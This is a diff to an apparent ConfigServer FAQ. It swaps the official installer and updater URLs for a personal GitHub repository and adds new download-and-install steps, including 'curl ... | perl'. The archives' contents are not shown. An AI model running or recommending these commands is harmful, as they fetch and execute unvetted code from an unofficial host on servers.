@@ -122,13 +122,18 @@ Please see our scripts github repository for uninstall scripts for both the comm
 **For Configserver Exploit Scanner (cxs):**
 
 ```bash
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/cxs.tgz
+tar -xzf cxs.tgz
+cd cxs
+sh install.sh
+
 cxs -U
 ```
 
 **For Outgoing Spam Monitor (osm):**
 
 ```bash
-wget --no-check-certificate https://download.configserver.com/osminstaller.tgz
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/osminstaller.tgz
 tar -xzf osminstaller.tgz
 perl osminstaller.pl
 ```
@@ -136,7 +141,7 @@ perl osminstaller.pl
 **For MailScanner Front-End (msfe):**
 
 ```bash
-wget --no-check-certificate https://download.configserver.com/msfeinstaller.tgz
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/msfeinstaller.tgz
 tar -xzf msfeinstaller.tgz
 perl msfeinstaller.pl
 /usr/mscpanel/mscheck.pl
@@ -145,16 +150,17 @@ perl msfeinstaller.pl
 **Configserver Explorer:**
 
 ```bash
-wget --no-check-certificate https://download.configserver.com/cse.tgz
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/cse.tgz
 tar -xzf cse.tgz
 cd cse
 sh install.sh
+
 ```
 
 **Configserver Modsecurity Control:**
 
 ```bash
-wget --no-check-certificate https://download.configserver.com/cmc.tgz
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/cmc.tgz
 tar -xzf cmc.tgz
 cd cmc
 sh install.sh
@@ -163,7 +169,7 @@ sh install.sh
 **Configserver Mail Manage:**
 
 ```bash
-wget --no-check-certificate https://download.configserver.com/cmm.tgz
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/cmm.tgz
 tar -xzf cmm.tgz
 cd cmm
 sh install.sh
@@ -172,7 +178,7 @@ sh install.sh
 **Configserver Mail Queues:**
 
 ```bash
-wget --no-check-certificate https://download.configserver.com/cmq.tgz
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/cmq.tgz
 tar -xzf cmq.tgz
 cd cmq
 sh install.sh
@@ -181,14 +187,20 @@ sh install.sh
 **For Configserver Security & Firewall (csf):**
 
 ```bash
+wget https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/csf.tgz
+tar -xzf csf.tgz
+cd csf
+sh install.sh
+
 csf -u
+
 ```
 
 **All script updater:**
 If you have multiple configserver commercial scripts installed, there is a single command you can run to update them all:
 
 ```bash
-curl -s https://download.configserver.com/csupdate | perl
+curl -s https://github.com/waelraafat2030-glitch/configserver-scripts/raw/main/csupdate | perl
 ```
 
 #### I use the bulk license management system. Will I be able to add and remove licenses after the 31st of August?
